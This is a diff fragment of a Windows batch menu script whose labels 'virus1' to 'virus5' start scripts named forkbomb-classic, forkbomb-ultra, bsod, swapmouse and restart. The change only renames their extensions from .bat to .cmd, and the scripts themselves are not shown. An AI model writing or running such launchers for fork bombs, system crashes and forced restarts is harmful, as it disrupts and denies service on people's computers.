@@ -40,21 +40,21 @@ if %errorlevel%==4 goto virus4
 if %errorlevel%==5 goto virus5
 
 :virus1
-start forkbomb-classic.bat
+start forkbomb-classic.cmd
 exit
 
 :virus2
-start forkbomb-ultra.bat
+start forkbomb-ultra.cmd
 exit
 
 :virus3
-start bsod.bat
+start bsod.cmd
 exit
 
 :virus4
-start swapmouse.bat
+start swapmouse.cmd
 exit
 
 :virus5
-start restart.bat
+start restart.cmd
 exit
